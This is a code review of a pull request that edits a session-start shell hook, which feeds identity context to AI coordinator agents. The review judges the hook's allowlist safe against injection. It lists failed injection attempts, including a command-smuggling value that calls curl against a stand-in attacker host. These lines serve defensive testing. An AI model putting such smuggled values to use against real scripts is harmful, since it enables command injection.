# PR #46 — SessionStart compact auto-continue

Date: 2026-04-24
PR: harukainguyen1411/strawberry-agents#46
Verdict: APPROVE (advisory)

## What the PR does

Two-line edit to `scripts/hooks/sessionstart-coordinator-identity.sh`: replaces
the `Reply only: ...` stop directive on the resolved-identity branch with a
continue-directive (scan TaskList, fallback to last-sessions shard, honour
explicit pause), and adds a `DO NOT auto-continue` clause to the fail-loud
branch.

## Injection-surface pattern worth remembering

The hook has two untrusted inputs that flow into the `additionalContext` JSON
string: `CLAUDE_AGENT_NAME`/`STRAWBERRY_AGENT` env vars and the
`.coordinator-identity` hint file. Both are guarded by a tight exact-match
allowlist at line 32 / 41 (`evelynn` or `sona` only), so `$COORDINATOR` is
always one of two literal strings before interpolation. This is the safe
pattern — no escaping needed because the input space is pre-constrained.

Attempted injections that failed the allowlist:
- Env var containing `"; curl evil.com; #`
- Multi-line hint file (`tr -d '[:space:]'` collapses newlines, making the
  combined string fail exact-match)
- Hint file containing `evelynn";}` (fails exact-match).

The `$_cap` derivation via `awk toupper` is also safe because it operates on
the already-validated `$COORDINATOR`.

Takeaway: when emitting user-visible JSON strings from shell, prefer
pre-interpolation allowlist validation over post-interpolation escaping.

## Rule 12 exemption reasoning

Hooks live in `scripts/hooks/` which is outside `apps/**`, so the TDD gate
doesn't apply. The behaviour under test — "Claude's next-turn response to an
`additionalContext` payload" — is not deterministically scriptable, so the
manual smoke-test path is the correct choice. Plan §Decision item 5 and §Test
plan correctly identify this.

## Verification invocations that worked

```
bash -n scripts/hooks/sessionstart-coordinator-identity.sh
CLAUDE_AGENT_NAME=evelynn bash <hook> <<< '{"source":"compact"}' | jq .
cd /tmp && CLAUDE_AGENT_NAME='' bash <abs-path-hook> <<< '{"source":"compact"}' | jq .
bash -x <hook> <<< '{"source":"compact"}'   # for injection tracing
```

Running from `/tmp` (non-git, no hint file) is the clean way to exercise the
fail-loud branch because the in-repo `.coordinator-identity` hint would
otherwise resolve.
